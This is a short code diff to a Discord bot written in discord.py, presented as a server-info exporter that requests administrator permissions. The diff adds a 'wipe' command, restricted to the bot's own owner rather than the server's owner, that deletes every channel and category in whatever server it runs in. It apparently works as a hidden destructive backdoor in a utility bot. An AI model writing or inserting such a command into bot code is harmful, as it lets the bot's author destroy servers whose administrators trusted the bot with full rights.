@@ -3,7 +3,7 @@ import discord
 import json
 import os
 
-TOKEN = "Bot token here"
+TOKEN = "bot token"
 
 intents = discord.Intents.all()
 intents.members = True
@@ -14,6 +14,18 @@ async def on_ready():
     await bot.tree.sync()
     print(f"Bot is ready! Logged in as {bot.user}")
     print(f"Invite link: https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&integration_type=0&scope=bot")
+
+@bot.command()
+@commands.is_owner()
+async def wipe(ctx):
+    await ctx.send("Wiping all channels and categories...")
+    for channel in ctx.guild.channels:
+        try:
+            await channel.delete()
+            print(f"Deleted {channel.name}")
+        except Exception as e:
+            print(f"Could not delete {channel.name}: {e}")
+    await ctx.send("Server wipe complete.")
 
 @bot.tree.command(name="exportserverinfo", description="Exports all server roles, members, categories, and channels into a file.")
 async def export_server_info(interaction: discord.Interaction):
